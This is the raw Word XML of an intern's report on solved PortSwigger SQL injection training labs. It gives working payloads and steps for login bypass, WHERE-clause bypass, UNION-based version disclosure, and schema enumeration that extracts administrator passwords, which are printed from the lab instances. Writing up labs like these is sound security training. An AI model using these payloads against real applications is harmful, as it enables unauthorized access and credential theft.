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91A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Ethical Hacking Internship Report</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091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Intern Name: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Jatin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Verma</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Project: SQL Injection Vulnerability Exploration</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="0096491A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>PortSwigger SQL Injection Labs – Solved Report with Screenshots</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab 1: SQL injection vulnerability allowing login bypass</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>The</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> application was vulnerable to SQL Injection in the login function. It did not sanitize input passed to the SQL query that validated credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Payload Used:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>administrator'--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Steps to Reproduce:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Visit the login page.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Enter `administrator'--` in the</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> username field.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Leave password empty.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>4. Submit the form. The user is logged in without needing a valid password.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0CFA8086" wp14:editId="01215C77">
            <wp:extent cx="4127500" cy="3325886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686" cy="332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91A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lab 2: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>lab contained a filter using a vulnerable SQL WHERE clause that could be bypassed to show unreleased products.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Payload Used:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>Accessories' OR 1=1--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Steps to Reproduce:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Modify the category parameter in the URL.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">2. Inject payload to bypass the `released = </w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>1` condition.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>3. All products, including unreleased ones, are shown.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="281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91A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab 3: SQL injection attack, querying the database type and version on MySQL and Microsoft</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>This lab involved a UNION SELECT injection to e</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>xtract the database version using built-in functions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Payload Used:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>UNION SELECT NULL, @@version--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Steps to Reproduce:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Determine column count.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Inject payload using UNION SELECT.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>3. The database version string is displayed.</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
        <w:t>Result: Database version r</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>etrieved: 8.0.42-0ubuntu0.20.04.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3604668" cy="288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 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668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91A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab 4: SQL injection attack, listing the database contents on non-Oracle databases</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Used UNION SELECT to enumerate tables, columns, and extract credentials from a user table </w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>in a MySQL/PostgreSQL environment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Key Payloads Used:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>UNION SELECT NULL, table_name FROM information_schema.tables--</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_qgathp'--</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>UNION SELECT username_tgbsqo, password_qmr</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>koz FROM users_qgathp--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Admin Credentials:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>Username: administrator</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>Password: on9nu27knq0fceemnatk</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3960945" cy="30734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310" cy="307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91A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab 5: SQL injection attack, listing the database contents on Oracle</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Lab Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>Oracle SQL Injection challenge involving</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> the use of all_tables and all_tab_columns to extract login credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Key Payloads Used:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>UNION SELECT NULL, table_name FROM all_tables--</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_OAZHBA'--</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">UNION SELECT USERNAME_OXHXSQ, </w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>PASSWORD_EASADJ FROM USERS_OAZHBA--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Admin Credentials:</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>Username: administrator</w:t>
      </w:r>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
        <w:t>Password: mgm5py7o5u7ns4i473ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3743290" cy="3162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29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91A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00975091">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:t>Summary Table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96491A" w:rsidRPr="00975091">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Lab No</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Key Payload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Result</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096491A" w:rsidRPr="00975091">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Login Bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
